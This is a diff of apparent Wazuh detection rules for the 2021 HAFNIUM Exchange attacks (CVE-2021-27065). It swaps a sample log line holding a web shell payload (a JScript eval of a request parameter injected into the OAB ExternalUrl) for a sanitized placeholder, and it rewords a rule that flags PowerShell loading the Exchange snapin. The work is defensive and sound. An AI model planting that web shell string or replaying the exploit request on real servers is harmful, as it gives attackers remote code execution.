@@ -40,7 +40,7 @@ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-se
     </rule>
 
 <!--
-Sample: 2021-04-06T14:54:38.677Z,WIN-03FGEGKLSPR,ECP.Request,"S:TIME=4365;S:SID=3a5d3a0b-a544-4d5c-9b1d-3d33d4968b48;'S:CMD=Set-OabVirtualDirectory.ExternalUrl=''http://o/#<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""eVIL""],""unsafe"");}</script>''.Identity=''87fc3593-ca62-4d08-93bd-7882275d33c1''';S:REQID=;S:URL=/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=MALCODEmOnE.&a=%5D:444/ecp/lkO.js;S:EX=;S:ACTID=c3f8f7e0-9817-46da-9ed4-fe575da51fbd;S:RS=0;S:BLD=15.0.847.32"
+Sample: 2021-04-06T14:54:38.677Z,WIN-03FGEGKLSPR,ECP.Request,"S:TIME=4365;S:SID=3a5d3a0b-a544-4d5c-9b1d-3d33d4968b48;'S:CMD=Set-OabVirtualDirectory.ExternalUrl=''http://o/#<sanitized>bad code goes here</sanitized>''.Identity=''87fc3593-ca62-4d08-93bd-782275d33c1''';S:REQID=;S:URL=/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=MALCOD.&a=%5D:444/ecp/lkO.js;S:EX=;S:ACTID=c3f8f7e0-9817-46da-9ed4-fe575da51fbd;S:RS=0;S:BLD=15.0.847.32"
 
 CVE-2021-27065  is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate
 with the Exchange server then they could use this vulnerability to write a file to any path on the server.
@@ -89,7 +89,7 @@ to exploit.
         <if_group>sysmon_event1</if_group>
         <field name="win.eventdata.originalFileName">powershell.exe|powershell_ISE.exe</field>
         <field name="win.eventdata.commandLine">Add-PSSnapin\s+Microsoft.Exchange.Powershell.Snapin</field>
-        <description>Powershell initializing MS Exchange snapin. Possible mailbox data exportation</description>
+        <description>Powershell initializing MS Exchange snapin. Possible mailbox data dump</description>
     </rule>
 </group>
 
